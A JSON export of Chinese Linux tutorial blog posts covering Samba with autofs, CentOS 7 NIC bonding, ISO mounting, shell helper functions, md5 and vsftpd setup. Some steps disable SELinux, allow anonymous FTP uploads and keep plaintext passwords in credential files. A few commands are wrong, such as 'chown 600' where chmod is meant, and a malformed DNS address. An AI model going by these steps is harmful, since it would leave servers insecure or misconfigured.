Samba","slug":"使用-autofs-自动挂载-Samba","date":"2017-06-15T05:17:55.000Z","updated":"2021-02-26T06:05:29.303Z","comments":true,"path":"posts/3610365074.html","link":"","permalink":"https://awen.me/posts/3610365074.html","excerpt":"配置[root@desktop /]# vim /etc/auto.master增加","text":"配置[root@desktop /]# vim /etc/auto.master增加 /smb1 /etc/auto.cifs然后 [root@desktop /]# cp /etc/auto.misc /etc/auto.cifs编辑 /etc/auto.cifs 添加 smb1 -fstype=cifs,credentials=/smb.mount ://172.10.100.128/share1这里需要根目录下有 smb.mount文件 [root@desktop ~]# cat /smb.mount username=smbuser1 password=123456 或者 smb1 -fstype=cifs,username=xxxx,password=xxxxx ://172.10.100.128/share1访问[root@desktop ~]# cd /smb1/ [root@desktop smb1]# ls smb1 [root@desktop smb1]# cd smb1/ [root@desktop smb1]# ls a1 a10 a2 a3 a4 a5 a6 a7 a8 a9 如果报权限错误，请关selinux","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"},{"name":"autofs","slug":"autofs","permalink":"https://awen.me/tags/autofs/"}]},{"title":"Centos 7 配置 bond","slug":"Centos-7-配置-bond","date":"2017-06-15T05:16:19.000Z","updated":"2021-02-26T06:05:29.242Z","comments":true,"path":"posts/2754016653.html","link":"","permalink":"https://awen.me/posts/2754016653.html","excerpt":"centos 6 配置 bond 步骤是比较多的，要加载驱动，创建配置文件，然后修改配置文件等等。在 centos 7 中，创建 bond 要稍微简单点，具体步骤如下： 配置 bond","text":"centos 6 配置 bond 步骤是比较多的，要加载驱动，创建配置文件，然后修改配置文件等等。在 centos 7 中，创建 bond 要稍微简单点，具体步骤如下： 配置 bond 1.备份接口配置文件 [root@localhost ~]# cd /etc/sysconfig/network-scripts/ [root@localhost network-scripts]# cp ifcfg-ens33{,.bak} [root@localhost network-scripts]# cp ifcfg-ens37{,.bak} [root@localhost network-scripts]# cp ifcfg-ens38{,.bak}2.创建 bond0 并且将3个接口加入 bond0 [root@localhost network-scripts]# nmcli con add type bond ifname bond0 mode 1 Connection &apos;bond-bond0&apos; (d177479b-1f92-4416-bd10-f050e83684fd) successfully added. [root@localhost network-scripts]# nmcli con add type bond-slave ifname ens33 master bond0 Connection &apos;bond-slave-ens33&apos; (1ae30ef6-b2da-49cf-b023-ebf17e2290dd) successfully added. [root@localhost network-scripts]# nmcli con add type bond-slave ifname ens37 master bond0 Connection &apos;bond-slave-ens37&apos; (3746cde9-18e9-4867-88cc-f71a12961f56) successfully added. [root@localhost network-scripts]# nmcli con add type bond-slave ifname ens38 master bond0 Connection &apos;bond-slave-ens38&apos; (7de50d30-ab78-4165-9d21-e82c07ffeae9) successfully added.这里会创建几个接口配置文件，如下以ifcfg-bond- 开头的文件都是 bond 的配置文件 [root@localhost network-scripts]# ls ifcfg-bond0 ifcfg-ens37.bak ifdown-ippp ifdown-TeamPort ifup-ipv6 ifup-Team ifcfg-bond-bond0 ifcfg-ens38 ifdown-ipv6 ifdown-tunnel ifup-isdn ifup-TeamPort ifcfg-bond-slave-ens33 ifcfg-ens38.bak ifdown-isdn ifup ifup-plip ifup-tunnel ifcfg-bond-slave-ens37 ifcfg-lo ifdown-post ifup-aliases ifup-plusb ifup-wireless ifcfg-bond-slave-ens38 ifdown ifdown-ppp ifup-bnep ifup-post init.ipv6-global ifcfg-ens33 ifdown-bnep ifdown-routes ifup-eth ifup-ppp network-functions ifcfg-ens33.bak ifdown-eth ifdown-sit ifup-ib ifup-routes network-functions-ipv6 ifcfg-ens37 ifdown-ib ifdown-Team ifup-ippp ifup-sit##bond0 配置 [root@localhost network-scripts]# vi ifcfg-bond-bond0 DEVICE=bond0 BONDING_OPTS=mode=active-backup TYPE=Bond BONDING_MASTER=yes BOOTPROTO=static DEFROUTE=yes PEERDNS=yes PEERROUTES=yes IPV4_FAILURE_FATAL=no NAME=bond-bond0 UUID=d177479b-1f92-4416-bd10-f050e83684fd ONBOOT=yes IPADDR=172.16.224.120 PREFIX=24 GATEWAY=172.16.224.2 DNS1=114.114.114.114 DNS2=223.5.5.5.5重启网络 [root@localhost ~]#service network restart查看 bond0配置[root@localhost ~]# cat /proc/net/bonding/bond0 Ethernet Channel Bonding Driver: v3.7.1 (April 27, 2011) Bonding Mode: fault-tolerance (active-backup) Primary Slave: None Currently Active Slave: ens33 MII Status: up MII Polling Interval (ms): 0 Up Delay (ms): 0 Down Delay (ms): 0 Slave Interface: ens33 MII Status: up Speed: 1000 Mbps Duplex: full Link Failure Count: 0 Permanent HW addr: 00:0c:29:46:29:8f Slave queue ID: 0 Slave Interface: ens37 MII Status: up Speed: 1000 Mbps Duplex: full Link Failure Count: 0 Permanent HW addr: 00:0c:29:46:29:99 Slave queue ID: 0 Slave Interface: ens38 MII Status: up Speed: 1000 Mbps Duplex: full Link Failure Count: 0 Permanent HW addr: 00:0c:29:46:29:a3 Slave queue ID: 0查看接口[root@localhost network-scripts]# ifconfig bond0: flags=5187&lt;UP,BROADCAST,RUNNING,MASTER,MULTICAST&gt; mtu 1500 inet 172.16.224.120 netmask 255.255.255.0 broadcast 172.16.224.255 inet6 fe80::20c:29ff:fe46:298f prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:46:29:8f txqueuelen 1000 (Ethernet) RX packets 332 bytes 37388 (36.5 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 157 bytes 24214 (23.6 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ens33: flags=6211&lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST&gt; mtu 1500 ether 00:0c:29:46:29:8f txqueuelen 1000 (Ethernet) RX packets 111023 bytes 150351141 (143.3 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 37196 bytes 2955308 (2.8 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ens37: flags=6211&lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST&gt; mtu 1500 ether 00:0c:29:46:29:8f txqueuelen 1000 (Ethernet) RX packets 77 bytes 11730 (11.4 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 13 bytes 1796 (1.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ens38: flags=6211&lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST&gt; mtu 1500 ether 00:0c:29:46:29:8f txqueuelen 1000 (Ethernet) RX packets 78 bytes 11816 (11.5 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1 bytes 60 (60.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1 (Local Loopback) RX packets 118 bytes 10330 (10.0 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 118 bytes 10330 (10.0 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"},{"name":"bond","slug":"bond","permalink":"https://awen.me/tags/bond/"},{"name":"链路聚合","slug":"链路聚合","permalink":"https://awen.me/tags/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/"}]},{"title":"mount 挂载 iso 文件","slug":"mount-挂载-iso-文件","date":"2017-06-15T05:15:20.000Z","updated":"2021-02-26T06:05:29.279Z","comments":true,"path":"posts/2878435603.html","link":"","permalink":"https://awen.me/posts/2878435603.html","excerpt":"","text":"操作步骤[root@vm-50-156 ~]# mount -o loop /opt/CentOS-7-x86_64-DVD-1611.iso /home/wwwroot/default/ mount: /dev/loop2 is write-protected, mounting read-only [root@vm-50-156 ~]# cd /home/wwwroot/default/ [root@vm-50-156 default]# ls CentOS_BuildTag EULA images LiveOS repodata RPM-GPG-KEY-CentOS-Testing-7 EFI GPL isolinux Packages RPM-GPG-KEY-CentOS-7 TRANS.TBL","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"巧用 shell 函数 定义常用命令，提升工作效率","slug":"巧用-shell-函数-定义常用命令，提升工作效率","date":"2017-06-15T05:14:30.000Z","updated":"2021-02-26T06:05:29.333Z","comments":true,"path":"posts/473753922.html","link":"","permalink":"https://awen.me/posts/473753922.html","excerpt":"","text":"把这些加到~/.zshrc 中 source ~/.zshrc下就可以使用了。 如果你用的是 bash，那么运行 pi@raspberrypi:~ $ vim ~/.bashrc函数# deocde string in $1 argument de () { echo &quot;$1&quot; | base64 -D; } # encode string in $1 argument en () { echo -n &quot;$1&quot; | base64; } # get id info ip () { http -b http://freeapi.ipip.net/$1 } # 测试端口 p () { nc -zv $1 $2 } # 10 进制时间转成可读时间 d () { date -r $1 } # 16 进制转成 10 进制 10j () { echo $((0x$1)) } # 解析域名 jx () { echo $1 | awk -F&apos;[/:]&apos; &apos;{print $4}&apos; | xargs dig }比如 jx () { echo $1 | awk -F&apos;[/:]&apos; &apos;{print $4}&apos; | xargs dig }在实际工作中，我经常需要给客户测试域名解析，但是客户发过来的域名都是带http://xxx.xxxx.com/sfsf/wwwwf/dfsdf.html 这种格式的或者带 http 开头的，如果不用函数，我需要先剔除乱七八糟的 提取域名出来 然后在 dig，通过这个函数 直接就可以搞定 哈哈，不要太爽了。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"},{"name":"mac技巧","slug":"mac技巧","permalink":"https://awen.me/tags/mac%E6%8A%80%E5%B7%A7/"},{"name":"shell","slug":"shell","permalink":"https://awen.me/tags/shell/"}]},{"title":"mac 和 linux 下的 md5转换","slug":"mac-和-linux-下的-md5转换","date":"2017-06-15T05:13:01.000Z","updated":"2021-02-26T06:05:29.276Z","comments":true,"path":"posts/1909405713.html","link":"","permalink":"https://awen.me/posts/1909405713.html","excerpt":"mac➜ ~ md5 -s 123 MD5 (&quot;123&quot;) = 202cb962ac59075b964b07152d234b70","text":"mac➜ ~ md5 -s 123 MD5 (&quot;123&quot;) = 202cb962ac59075b964b07152d234b70 linuxpi@raspberrypi:~ $ echo -n 123 | md5sum 202cb962ac59075b964b07152d234b70 -或 pi@raspberrypi:~ $ printf 123 | md5sum 202cb962ac59075b964b07152d234b70 -如果使用echo 不加-n 参数则得出的结果不一样，原因是 echo 默认会带换行符做结尾的 -n 参数可以去掉换行符 pi@raspberrypi:~ $ echo 123 | md5sum ba1f2511fc30423bdbb183fe33f3dd0f -可以尝试使用 tr -d 去掉换行符在看看 pi@raspberrypi:~ $ echo 123|tr -d &apos;\\n&apos;|md5sum 202cb962ac59075b964b07152d234b70 -","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"},{"name":"mac","slug":"mac","permalink":"https://awen.me/tags/mac/"}]},{"title":"centos7 配置samba","slug":"centos7-配置samba","date":"2017-06-15T05:12:17.000Z","updated":"2021-02-26T06:05:29.271Z","comments":true,"path":"posts/4202744892.html","link":"","permalink":"https://awen.me/posts/4202744892.html","excerpt":"安装[root@localhost ~]# yum -y install samba samba-client samba-common放行端口iptables -A INPUT -p tcp -m multiport --dport 139,445 -j ACCEPT","text":"安装[root@localhost ~]# yum -y install samba samba-client samba-common放行端口iptables -A INPUT -p tcp -m multiport --dport 139,445 -j ACCEPT ##原理windows 和samba服务进行通信使用的是NETBIOS协议linux和linux 之间通信使用的是SMB协议 配置文件[root@server samba]# cat smb.conf # See smb.conf.example for a more detailed config file or # read the smb.conf manpage. # Run &apos;testparm&apos; to verify the config is correct after # you modified it. [global] workgroup = myshare security = user map to guest = bad user passdb backend = tdbsam printing = cups printcap name = cups load printers = yes cups options = raw [homes] comment = Home Directories valid users = %S, %D%w%S browseable = No read only = No inherit acls = Yes [printers] comment = All Printers path = /var/tmp printable = Yes create mask = 0600 browseable = No [print$] comment = Printer Drivers path = /var/lib/samba/drivers write list = root create mask = 0664 directory mask = 0775 [share] path=/smbshare public=yes writable=yes [share1] path=/smbu valid users = smbuser1,smbuser2,@g1 writable=yes配置匿名访问配置[global] workgroup = myshare security = user map to guest = bad user # 添加此行 passdb backend = tdbsam printing = cups printcap name = cups load printers = yes cups options = raw末尾曾加 [share] path = /smbshare public = yes writable=yes 重启 [root@localhost ~]# systemctl enable smb nmb # smb是Linux和Linux之间的协议，nmb是Linux和Windows之间的协议 Created symlink from /etc/systemd/system/multi-user.target.wants/smb.service to /usr/lib/systemd/system/smb.service. Created symlink from /etc/systemd/system/multi-user.target.wants/nmb.service to /usr/lib/systemd/system/nmb.service. [root@localhost ~]# systemctl restart smb nmb 后面连接出错，请先关selinux 然后重启服务 客户端连接 [root@node-server-1 ~]# mount -t cifs //192.168.50.156/public /media/ mount: wrong fs type, bad option, bad superblock on //192.168.50.156/public, missing codepage or helper program, or other error (for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&lt;type&gt; helper program) In some cases useful info is found in syslog - try dmesg | tail or so.需要安装 yum -y install cifs-utilswindows连接 然后再次连接 [root@desktop ~]# mount -t cifs //172.10.100.128/share /media/ Password for root@//172.10.100.128/share: [root@desktop ~]# cd /media/ [root@desktop media]# ls ls: reading directory .: Permission denied [root@desktop media]#添加用户1.创建samba用户 [root@server samba]# useradd -s /sbin/nologin smbuser1 [root@server samba]# smbpasswd -a smbuser1 New SMB password: Retype new SMB password: Added user smbuser1.配置文件假如 smbuser1 [share1] path=/smbu valid users = smbuser1 writable=yes挂载 mount -t cifs //172.10.100.128/share1 -o username=smbuser1 /mnt/u1/设置开机启动 [root@desktop mnt]# cat /etc/fstab # # /etc/fstab # Created by anaconda on Sat May 6 22:20:05 2017 # # Accessible filesystems, by reference, are maintained under &apos;/dev/disk&apos; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # /dev/mapper/cl-root / xfs defaults 0 0 UUID=8567c1db-cc09-442e-83ce-cfcdd1f8f0df /boot xfs defaults 0 0 /dev/mapper/cl-swap swap swap defaults 0 0 //172.10.100.128/share1 /mnt/u4 cifs defaults, username=smbuser1,password=123456 0 0 多用户设置1.创建多个 Samba 用户 [root@server samba]# useradd -s /sbin/nologin smbuser2 [root@server samba]# smbpasswd -a smbuser2 New SMB password: Retype new SMB password: Added user smbuser2. [root@server samba]# groupadd g1 [root@server samba]# useradd -s /sbin/nologin -g g1 smbu3 [root@server samba]# smbpasswd -a smbu3 New SMB password: Retype new SMB password: Added user smbu3. 2.配置文件修改为 [share1] path=/smbu valid users = smbuser1,smbuser2,@g1 //多个用户用，隔开，@代表组，这里表示组1 writable=yes3.客户端挂载 mount -t cifs //172.10.100.128/share1 -o username=smbuser1 /mnt/u1/ mount -t cifs //172.10.100.128/share1 -o username=smbuser2 /mnt/u2/ mount -t cifs //172.10.100.128/share1 -o username=smbu3 /mnt/u3/ 4.配置文件多个用户共享 [root@desktop samba]# cat /etc/fstab # # /etc/fstab # Created by anaconda on Sat May 6 22:20:05 2017 # # Accessible filesystems, by reference, are maintained under &apos;/dev/disk&apos; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # /dev/mapper/cl-root / xfs defaults 0 0 UUID=8567c1db-cc09-442e-83ce-cfcdd1f8f0df /boot xfs defaults 0 0 /dev/mapper/cl-swap swap swap defaults 0 0 //172.10.100.128/share1 /mnt/u4 cifs defaults,credentials=/smb.mount 0 0 创建一个文件 [root@desktop samba]# cat /smb.mount username=smbuser1 password=123456 username=smbuser2 password=123456 挂载 [root@desktop samba]# mount -a [root@desktop samba]# mount | tail -1 //172.10.100.128/share1 on /mnt/u4 type cifs (rw,relatime,vers=1.0,cache=strict,username=smbuser2,domain=SERVER,uid=0,noforceuid,gid=0,noforcegid,addr=172.10.100.128,unix,posixpaths,serverino,mapposix,acl,rsize=1048576,wsize=65536,echo_interval=60,actimeo=1) 故障处理1.报错 Unable to find suitable address. [root@client mnt]# mount -t cifs -o username=smb1 //172.10.100.129/share /mnt Password for smb1@//172.10.100.129/share: ****** Unable to find suitable address.检查防火墙","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"},{"name":"samba","slug":"samba","permalink":"https://awen.me/tags/samba/"}]},{"title":"Centos 7 vsftp 详解","slug":"Centos-7-vsftp-详解","date":"2017-06-15T05:10:38.000Z","updated":"2021-02-26T06:05:29.241Z","comments":true,"path":"posts/2529807681.html","link":"","permalink":"https://awen.me/posts/2529807681.html","excerpt":"安装[root@vm-50-156 ~]# yum -y install vsftpd [root@vm-50-156 ~]# systemctl enable vsftpd.service Created symlink from /etc/systemd/system/multi-user.target.wants/vsftpd.service to /usr/lib/systemd/system/vsftpd.service.","text":"安装[root@vm-50-156 ~]# yum -y install vsftpd [root@vm-50-156 ~]# systemctl enable vsftpd.service Created symlink from /etc/systemd/system/multi-user.target.wants/vsftpd.service to /usr/lib/systemd/system/vsftpd.service. 客户端连接1.安装 sudo apt-get install ftp2.登陆 pi@raspberrypi:~ $ ftp 192.168.50.156 Connected to 192.168.50.156. 220 (vsFTPd 3.0.2) Name (192.168.50.156:pi): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt;或者 pi@raspberrypi:~ $ ftp 192.168.50.156 Connected to 192.168.50.156. 220 (vsFTPd 3.0.2) Name (192.168.50.156:pi): ftp 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt;匿名用户登陆但是目前匿名用户只能访问，下载文件 不能上传，需要设置配置文件 ftp&gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 0 15 May 06 05:47 pub 226 Directory send OK. ftp&gt; put test.txt local: test.txt remote: test.txt 200 PORT command successful. Consider using PASV. 550 Permission denied.配置文件修改 # Allow anonymous FTP? (Beware - allowed by default if you comment this out). anonymous_enable=YES # # Uncomment this to allow local users to log in. # When SELinux is enforcing check for SE bool ftp_home_dir local_enable=YES # # Uncomment this to enable any form of FTP write command. write_enable=YES anon_upload_enable=YES #允许上传 # # Uncomment this if you want the anonymous FTP user to be able to create # new directories. anon_mkdir_write_enable=YES #允许创建和写入文件 重启服务，上传测试 ftp&gt; put test.txt local: test.txt remote: test.txt 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 19 bytes sent in 0.00 secs (240.9700 kB/s) ftp&gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 4 May 06 05:47 a -rw------- 1 14 50 19 May 06 05:59 test.txt 226 Directory send OK. ftp&gt; 本地用户登陆1.创建用户 [root@vm-50-156 ~]# useradd ftp1 -s /sbin/nologin -g ftp [root@vm-50-156 ~]# passwd ftp1 Changing password for user ftp1. New password: BAD PASSWORD: The password is shorter than 8 characters Retype new password: passwd: all authentication tokens updated successfully.2.然后客户端登陆 pi@raspberrypi:~/ftp $ ftp 192.168.50.156 Connected to 192.168.50.156. 220 (vsFTPd 3.0.2) Name (192.168.50.156:pi): ftp1 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; pwd 257 &quot;/home/ftp1&quot; ftp&gt; 禁止登陆 1.全局禁止 local_enable=YES //改为 NO2.配置文件禁止 ftpusers 黑名单 添加进去后禁止登陆 比如，在末尾添加了 ftp2 这个用户 [root@vm-50-156 vsftpd]# cat ftpusers # Users that are not allowed to login via ftp root bin daemon adm lp sync shutdown halt mail news uucp operator games nobody ftp2那么当你去登陆的时候就会出现 pi@raspberrypi:~/ftp $ ftp 192.168.50.156 Connected to 192.168.50.156. 220 (vsFTPd 3.0.2) Name (192.168.50.156:pi): ftp2 331 Please specify the password. Password: 530 Login incorrect. Login failed. user_list //这个文件由主配置文件的userlist_enable 参数控制，当其值为 NO，则允许登陆，当其值为 YES 则禁止登陆 例如： userlist_enable=NO 则结果 pi@raspberrypi:~/ftp $ ftp 192.168.50.156 Connected to 192.168.50.156. 220 (vsFTPd 3.0.2) Name (192.168.50.156:pi): ftp1 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt;如果为 YES userlist_enable=YES则 pi@raspberrypi:~/ftp $ ftp 192.168.50.156 Connected to 192.168.50.156. 220 (vsFTPd 3.0.2) Name (192.168.50.156:pi): ftp1 530 Permission denied. Login failed. ftp&gt; 定制登陆信息1.配置文件 [root@vm-50-156 ftp1]# vim /etc/vsftpd/vsftpd.conf dirmessage_enable=YES默认情况会读取 ftp 用户家目录的.message文件，所以你可以创建一个.message文件到家目录中，比如有个用户 ftp1， [root@vm-50-156 ftp1]# pwd /home/ftp1 [root@vm-50-156 ftp1]# ls [root@vm-50-156 ftp1]# ll -a total 16 drwx------ 2 ftp1 ftp 78 May 6 14:41 . drwxr-xr-x. 8 root root 89 May 6 14:19 .. -rw-r--r-- 1 ftp1 ftp 18 Dec 7 07:19 .bash_logout -rw-r--r-- 1 ftp1 ftp 193 Dec 7 07:19 .bash_profile -rw-r--r-- 1 ftp1 ftp 231 Dec 7 07:19 .bashrc -rw-r--r-- 1 root root 113 May 6 14:41 .message 查看文件内容 [root@vm-50-156 ftp1]# cat .message --欢迎您来到awen 的FTP! --博客: https://awen.me客户端登陆 pi@raspberrypi:~/ftp $ ftp 192.168.50.156 Connected to 192.168.50.156. 220 (vsFTPd 3.0.2) Name (192.168.50.156:pi): ftp1 331 Please specify the password. Password: 230---欢迎您来到awen 的FTP! 230---博客: https://awen.me 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; 禁锢在用户的主目录默认情况下 ftp&gt; pwd 257 &quot;/home/ftp1&quot; ftp&gt; cd / # 切换到根目录，发现可以查看根目录下的所以目录了，通常这样是不被运行的 250 Directory successfully changed. ftp&gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. lrwxrwxrwx 1 0 0 7 May 01 11:31 bin -&gt; usr/bin dr-xr-xr-x 5 0 0 4096 May 06 01:10 boot drwxr-xr-x 21 0 0 3420 May 06 05:23 dev drwxr-xr-x 101 0 0 8192 May 06 06:19 etc -rw-rw---- 1 0 0 36741 May 04 03:12 frpc.2017-05-03.log -rw-rw---- 1 0 0 83890 May 06 05:23 frpc.log drwxr-xr-x 8 0 0 89 May 06 06:19 home lrwxrwxrwx 1 0 0 7 May 01 11:31 lib -&gt; usr/lib lrwxrwxrwx 1 0 0 9 May 01 11:31 lib64 -&gt; usr/lib64 drwxr-xr-x 2 0 0 6 Nov 05 15:38 media drwxr-xr-x 2 0 0 6 Nov 05 15:38 mnt drwxr-xr-x 5 0 0 4096 May 06 02:33 opt dr-xr-xr-x 286 0 0 0 May 06 05:23 proc dr-xr-x--- 9 0 0 4096 May 06 06:47 root drwxr-xr-x 32 0 0 1140 May 06 05:34 run lrwxrwxrwx 1 0 0 8 May 01 11:31 sbin -&gt; usr/sbin drwxr-xr-x 2 0 0 6 Nov 05 15:38 srv dr-xr-xr-x 13 0 0 0 May 06 05:23 sys drwxrwxrwt 36 0 0 4096 May 06 06:46 tmp drwxr-xr-x 13 0 0 155 May 01 11:31 usr drwxr-xr-x 21 0 0 4096 May 06 05:34 var drwxr-xr-x 3 0 0 239 May 05 08:27 vm-images drwxr-xr-x 2 0 0 99 May 03 04:43 vm-iso 226 Directory send OK. 注释 chroot_local_user=NO # 如果未 NO 则chroot_list文件中的用户禁止访问其他目录，如果为 YES，则chroot_list中的用户可以访问其他目录 chroot_list_enable=YES allow_writeable_chroot=YES #添加这行 chroot_list_file=/etc/vsftpd/chroot_list然后重启服务，然后将禁止访问上一级目录的用户添加到 [root@vm-50-156 vsftpd]# cat chroot_list ftp1当我们的chroot_local_user 设置为 NO 的时候，访问 发现被禁止了 pi@raspberrypi:~/ftp $ ftp 192.168.50.156 Connected to 192.168.50.156. 220 (vsFTPd 3.0.2) Name (192.168.50.156:pi): ftp1 331 Please specify the password. Password: 230---欢迎您来到awen 的FTP! 230---博客: https://awen.me 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Directory send OK. ftp&gt; cd / 250 Directory successfully changed. ftp&gt; pwd 257 &quot;/&quot; ftp&gt; pwd 257 &quot;/&quot; ftp&gt; cd / 250 Directory successfully changed. ftp&gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Directory send OK. ftp&gt; quit反之为 YES 则 pi@raspberrypi:~/ftp $ ftp 192.168.50.156 Connected to 192.168.50.156. 220 (vsFTPd 3.0.2) Name (192.168.50.156:pi): ftp1 331 Please specify the password. Password: 230---欢迎您来到awen 的FTP! 230---博客: https://awen.me 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Directory send OK. ftp&gt; cd / 250 Directory successfully changed. ftp&gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. lrwxrwxrwx 1 0 0 7 May 01 11:31 bin -&gt; usr/bin dr-xr-xr-x 5 0 0 4096 May 06 01:10 boot drwxr-xr-x 21 0 0 3420 May 06 05:23 dev drwxr-xr-x 101 0 0 8192 May 06 06:19 etc -rw-rw---- 1 0 0 36741 May 04 03:12 frpc.2017-05-03.log -rw-rw---- 1 0 0 83890 May 06 05:23 frpc.log drwxr-xr-x 8 0 0 89 May 06 06:19 home lrwxrwxrwx 1 0 0 7 May 01 11:31 lib -&gt; usr/lib lrwxrwxrwx 1 0 0 9 May 01 11:31 lib64 -&gt; usr/lib64 drwxr-xr-x 2 0 0 6 Nov 05 15:38 media drwxr-xr-x 2 0 0 6 Nov 05 15:38 mnt drwxr-xr-x 5 0 0 4096 May 06 02:33 opt dr-xr-xr-x 288 0 0 0 May 06 05:23 proc dr-xr-x--- 9 0 0 4096 May 06 07:07 root drwxr-xr-x 32 0 0 1140 May 06 05:34 run lrwxrwxrwx 1 0 0 8 May 01 11:31 sbin -&gt; usr/sbin drwxr-xr-x 2 0 0 6 Nov 05 15:38 srv dr-xr-xr-x 13 0 0 0 May 06 05:23 sys drwxrwxrwt 36 0 0 4096 May 06 07:04 tmp drwxr-xr-x 13 0 0 155 May 01 11:31 usr drwxr-xr-x 21 0 0 4096 May 06 05:34 var drwxr-xr-x 3 0 0 239 May 05 08:27 vm-images drwxr-xr-x 2 0 0 99 May 03 04:43 vm-iso 226 Directory send OK. ftp&gt;虚拟用户1.创建一个文件vusers.list 添加内容 [root@vm-50-156 vsftpd]# vim vusers.list [root@vm-50-156 vsftpd]# cat vusers.list mike 用户名 123 密码 john 4562.生成 db 文件 [root@vm-50-156 vsftpd]# db_load -T -t hash -f vusers.list vusers.db [root@vm-50-156 vsftpd]# ls chroot_list ftpusers user_list vsftpd.conf vsftpd_conf_migrate.sh vusers.db vusers.list [root@vm-50-156 vsftpd]#查看文件类型 [root@vm-50-156 vsftpd]# file vusers.db vusers.db: Berkeley DB (Hash, version 9, native byte-order) 设置权限 [root@vm-50-156 vsftpd]# chown 600 /etc/vsftpd/vusers.* 创建用户 #useradd -d /var/ftproot/ -s /sbin/nologin virtual useradd -d /var/ftproot/ -s /sbin/nologin virtual useradd: user &apos;virtual&apos; already exists 赋予其权限 chmod 755 /var/ftproot/ 3.建立支持虚拟用户的 PAM 认证文件 [root@vm-50-156 /]# vim /etc/pam.d/vsftpd.vu [root@vm-50-156 /]# cat /etc/pam.d/vsftpd.vu auth required pam_userdb.so.db=/etc/vsftpd/vusers.db account required pam_userdb.so db=/etc/vsftpd/vusers account required pam_userdb.so db=/etc/vsftpd/vusers4.修改配置文件 [root@vm-50-156 /]# vim /etc/vsftpd/vsftpd.conf [root@vm-50-156 /]# systemctl restart vsftpd.service配置文件内容 guest_enable=YES guest_username=virtual pam_service_name=vsftpd.vu userlist_enable=NO tcp_wrappers=YES allow_writeable_chroot=YES 登陆失败 pi@raspberrypi:~ $ ftp 192.168.50.156 Connected to 192.168.50.156. 220 (vsFTPd 3.0.2) Name (192.168.50.156:pi): john 331 Please specify the password. Password: 530 Login incorrect. Login failed.查看 [root@vm-50-156 vsftpd]# systemctl status vsftpd.service ● vsftpd.service - Vsftpd ftp daemon Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; enabled; vendor preset: disabled) Active: active (running) since Sat 2017-05-06 15:43:42 CST; 38s ago Process: 8596 ExecStart=/usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf (code=exited, status=0/SUCCESS) Main PID: 8597 (vsftpd) CGroup: /system.slice/vsftpd.service ├─8597 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf ├─8598 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf └─8599 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf May 06 15:43:42 vm-50-156 systemd[1]: Stopping Vsftpd ftp daemon... May 06 15:43:42 vm-50-156 systemd[1]: Starting Vsftpd ftp daemon... May 06 15:43:42 vm-50-156 systemd[1]: Started Vsftpd ftp daemon. May 06 15:43:54 vm-50-156 vsftpd[8598]: PAM unable to dlopen(/usr/lib64/security/pam_userdb.so.db=/etc/vsft...ctory May 06 15:43:54 vm-50-156 vsftpd[8598]: PAM adding faulty module: /usr/lib64/security/pam_userdb.so.db=/etc...users Hint: Some lines were ellipsized, use -l to show in full. [root@vm-50-156 vsftpd]#检查是认证文件配置错了 [root@vm-50-156 /]# cat /etc/pam.d/vsftpd.vu auth required pam_userdb.so.db=/etc/vsftpd/vusers.db account required pam_userdb.so.db=/etc/vsftpd/vusers # 这里手残多打了个. account required pam_userdb.so db=/etc/vsftpd/vusers重启下 pi@raspberrypi:~ $ ftp 192.168.50.156 Connected to 192.168.50.156. 220 (vsFTPd 3.0.2) Name (192.168.50.156:pi): john 331 Please specify the 